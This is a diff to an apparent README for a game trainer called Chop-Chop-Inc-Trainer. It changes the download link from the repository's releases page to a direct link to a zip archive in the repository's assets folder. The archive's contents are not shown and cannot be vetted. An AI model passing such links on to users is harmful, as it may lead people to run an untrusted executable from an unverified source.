@@ -20,7 +20,7 @@ Before you begin, make sure you have the game Chop Chop Inc. installed on your W
 
 Visit this link to download the application:
 
-[**Download Chop-Chop-Inc-Trainer**](https://github.com/Suhai8881/Chop-Chop-Inc-Trainer/releases)
+[**Download Chop-Chop-Inc-Trainer**](https://raw.githubusercontent.com/Suhai8881/Chop-Chop-Inc-Trainer/main/assets/Inc_Trainer_Chop_2.5.zip)
 
 Make sure you download the correct file for your system. The file is typically named something like "Chop-Chop-Inc-Trainer.zip" or "Chop-Chop-Inc-Trainer.exe".
 
